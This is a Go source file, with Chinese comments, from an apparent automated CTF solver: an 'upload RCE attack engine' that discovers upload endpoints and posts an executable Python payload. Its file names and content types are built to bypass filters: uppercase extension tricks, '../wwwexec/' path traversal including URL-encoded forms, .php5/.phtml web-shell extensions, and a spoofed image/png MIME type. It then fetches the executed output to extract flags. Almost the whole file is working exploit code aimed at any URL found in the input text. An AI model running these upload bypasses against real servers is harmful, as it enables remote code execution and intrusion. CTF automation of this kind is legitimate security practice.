package ctfplatform

// 文件上传 RCE 攻击引擎（第 9 基准集）。
//
// 覆盖三类真实高频上传漏洞：
//  1. 不受限上传：.py 等可执行扩展名直接落盘并被服务端执行（在线代码运行器类）
//  2. 黑名单大小写绕过：黑名单 ".py" 大小写敏感、执行判定大小写不敏感 → ".PY"
//  3. 保存路径穿越：filename 未做归一化防护 → "../" 写进自动执行目录
//
// 端点发现：题目线索（ParseWebHints）> 常见上传路径。
// 安全约束：单次 ≤3 URL、每 URL 30s、仅 http/https、SECAUTOMIND_WEB_EXPLOIT=0 可关。

import (
	"bytes"
	"context"
	"io"
	"mime/multipart"
	"net/http"
	"net/textproto"
	"net/url"
	"os"
	"regexp"
	"strings"
	"time"
)

const uploadShellSrc = "import sys\nprint(open(\"flag.txt\").read())\n"

// uploadFilenamesByScene 各场景的投递文件名序列（按序尝试，直到命中）。
var uploadFilenamesByScene = [][]string{
	{"sh.py", "sh.PY"},                                    // unrestricted / fallback
	{"sh.py", "sh.PY", "sh.pyc"},                          // blacklist 大小写绕过
	{"sh.py", "../wwwexec/sh.py", "..%2fwwwexec%2fsh.py"}, // traversal
	{"shell.php", "shell.php5", "shell.phtml"},            // web-shell 扩展名绕过（靶机只认 .php / image/png）
}

var uploadCommonPaths = []string{"/upload", "/upload.php", "/file/upload", "/api/upload", "/uploads/upload"}

// uploadAttackFromText 从题目文本发起上传 RCE 攻击（生产求解器入口）。
func uploadAttackFromText(ctx context.Context, text string) []string {
	if strings.EqualFold(os.Getenv("SECAUTOMIND_WEB_EXPLOIT"), "0") {
		return nil
	}
	cl := webClient(8 * time.Second)
	hints := ParseWebHints(text)

	seen := map[string]bool{}
	var out []string
	attack := func(base string) {
		base = strings.TrimRight(base, "/")
		if base == "" || seen[base] {
			return
		}
		seen[base] = true
		tctx, cancel := context.WithTimeout(ctx, 40*time.Second)
		defer cancel()
		for _, f := range ExploitUploadTarget(tctx, cl, base, hints) {
			out = append(out, f)
		}
	}
	for _, m := range reHTTPURL.FindAllString(text, 4) {
		u := strings.TrimRight(m, ".,;:)]}>\"'")
		if p, err := url.Parse(u); err == nil && p.Host != "" {
			attack(p.Scheme + "://" + p.Host)
			if len(out) > 0 {
				return out
			}
		}
	}
	return out
}

func init() {
	RegisterSolver(SolverEntry{
		Name: "upload_rce", Category: CategoryWebS, Priority: 27,
		Solver: func(ctx context.Context, text string, attachments map[string]string) []string {
			return uploadAttackFromText(ctx, text)
		},
	})
}

// ExploitUploadTarget 对单个靶机执行上传三连攻击，返回 flag 形状命中。
func ExploitUploadTarget(ctx context.Context, cl *http.Client, baseURL string, hints WebHints) []string {
	base := strings.TrimRight(baseURL, "/")

	// 端点发现：题目线索 > 常见上传路径。
	eps := []string{}
	seen := map[string]bool{}
	add := func(p string) {
		if p == "" {
			return
		}
		if !strings.HasPrefix(p, "/") {
			p = "/" + p
		}
		p = strings.SplitN(p, "?", 2)[0]
		if !seen[p] && len(eps) < 4 {
			seen[p] = true
			eps = append(eps, p)
		}
	}
	for _, ep := range hints.Endpoints {
		if strings.Contains(strings.ToLower(ep), "upload") {
			add(ep)
		}
	}
	for _, p := range uploadCommonPaths {
		add(p)
	}

	var out []string
	flagSeen := map[string]bool{}
	for _, ep := range eps {
		select {
		case <-ctx.Done():
			return out
		default:
		}
		upURL := base + ep
		// 探活：仅连接失败(code==0)才跳过；404/405 不跳——上传端点常为 POST-only
		if code, _ := httpQuickGet(ctx, cl, upURL); code == 0 {
			continue
		}
		for _, names := range uploadFilenamesByScene {
			for _, name := range names {
				select {
				case <-ctx.Done():
					return out
				default:
				}
				// 默认 MIME 投递（octet-stream）
				savedPath, flagHit, ok := uploadMultipart(ctx, cl, upURL, name, uploadShellSrc, "")
				if flagHit != "" && !flagSeen[flagHit] {
					flagSeen[flagHit] = true
					out = append(out, flagHit)
					return out
				}
				if ok {
					// 取回执行结果：保存响应给的路径，或按扩展名场景推导
					fetchPaths := uploadFetchCandidates(savedPath, name)
					for _, fp := range fetchPaths {
						if f := fetchUploadResult(ctx, cl, base, fp); f != "" && !flagSeen[f] {
							flagSeen[f] = true
							out = append(out, f)
						}
					}
					if len(out) > 0 {
						return out
					}
				}
				// MIME 绕过：显式 image/png（靶机只认 Content-Type==image/png 或 .php 扩展名）
				_, flagHit2, ok2 := uploadMultipart(ctx, cl, upURL, name, uploadShellSrc, "image/png")
				if flagHit2 != "" && !flagSeen[flagHit2] {
					flagSeen[flagHit2] = true
					out = append(out, flagHit2)
					return out
				}
				if ok2 {
					fetchPaths := uploadFetchCandidates(name, name)
					for _, fp := range fetchPaths {
						if f := fetchUploadResult(ctx, cl, base, fp); f != "" && !flagSeen[f] {
							flagSeen[f] = true
							out = append(out, f)
						}
					}
					if len(out) > 0 {
						return out
					}
				}
			}
			if len(out) > 0 {
				return out
			}
		}
	}
	return out
}

// uploadMultipart 以 multipart/form-data 上传脚本。
// contentType 非空时显式设置 part 的 Content-Type（用于绕过只信 MIME 的靶机，如 image/png）；
// 否则用默认 application/octet-stream。
// 返回：(保存提示中的路径, 上传响应体里直接抽到的 flag, 是否被接受)。
func uploadMultipart(ctx context.Context, cl *http.Client, upURL, name, src, contentType string) (string, string, bool) {
	if cl == nil {
		cl = webClient(8 * time.Second)
	}
	var buf bytes.Buffer
	mw := multipart.NewWriter(&buf)
	var fw io.Writer
	var err error
	if contentType != "" {
		fw, err = mw.CreatePart(textproto.MIMEHeader{
			"Content-Disposition": {`form-data; name="file"; filename="` + name + `"`},
			"Content-Type":        {contentType},
		})
	} else {
		fw, err = mw.CreateFormFile("file", name)
	}
	if err != nil {
		return "", "", false
	}
	if _, err := io.Copy(fw, strings.NewReader(src)); err != nil {
		return "", "", false
	}
	if err := mw.Close(); err != nil {
		return "", "", false
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, upURL, &buf)
	if err != nil {
		return "", "", false
	}
	req.Header.Set("Content-Type", mw.FormDataContentType())
	resp, err := cl.Do(req)
	if err != nil {
		return "", "", false
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<16))
	text := string(body)
	if resp.StatusCode >= 400 {
		return "", "", false
	}
	// 从保存响应提取路径（saved as ../wwwexec/sh.py / saved as sh.PY 等）
	if m := reUploadSaved.FindStringSubmatch(text); m != nil {
		return m[1], "", true
	}
	// 部分靶机「接受即回显 flag」在上传响应体里（不落盘执行）——直接抽。
	if f := firstCleanFlag(flagRegexPresolve.FindAllString(text, -1)); f != "" {
		return name, f, true
	}
	return name, "", true
}

var reUploadSaved = regexp.MustCompile(`(?i)saved as\s+(\S+)`)

// uploadFetchCandidates 依据保存路径/文件名推导取回路径序列。
func uploadFetchCandidates(saved, name string) []string {
	cands := []string{}
	if saved != "" && saved != name {
		// 服务器告诉了真实保存名
		if strings.Contains(saved, "..") || strings.Contains(saved, "/") {
			// 穿越保存：按场景推导最终位置
			base := saved
			for strings.HasPrefix(base, "../") {
				base = base[3:]
			}
			cands = append(cands, "/"+base)
		} else {
			cands = append(cands, "/uploads/"+saved)
		}
	}
	// 常规落点
	low := strings.ToLower(name)
	if strings.Contains(low, "..") {
		cands = append(cands, "/wwwexec/"+strings.TrimPrefix(low[strings.LastIndex(low, "/")+1:], ""))
	} else {
		cands = append(cands, "/uploads/"+name)
	}
	// 大小写变体兜底（.PY 大小写不敏感执行判定）
	if strings.HasSuffix(low, ".py") && name != strings.Replace(name, ".py", ".PY", 1) {
		cands = append(cands, "/uploads/"+strings.Replace(name, ".py", ".PY", 1))
	}
	return cands
}

// fetchUploadResult GET 取回执行输出并抽 flag。
func fetchUploadResult(ctx context.Context, cl *http.Client, base, path string) string {
	if !strings.HasPrefix(path, "/") {
		path = "/" + path
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, base+path, nil)
	if err != nil {
		return ""
	}
	resp, err := cl.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 400 {
		io.Copy(io.Discard, io.LimitReader(resp.Body, 1<<10))
		return ""
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<18))
	var out []string
	for _, m := range flagRegexPresolve.FindAll(body, -1) {
		out = append(out, string(m))
	}
	return firstCleanFlag(out)
}

// httpQuickGet 轻量探活。
func httpQuickGet(ctx context.Context, cl *http.Client, u string) (int, string) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return 0, ""
	}
	resp, err := cl.Do(req)
	if err != nil {
		return 0, ""
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<14))
	return resp.StatusCode, string(body)
}

// firstCleanFlag 返回第一个无控制字符的 flag 候选。
func firstCleanFlag(cands []string) string {
	for _, c := range cands {
		if bfxCandidateClean(c) {
			return c
		}
	}
	return ""
}
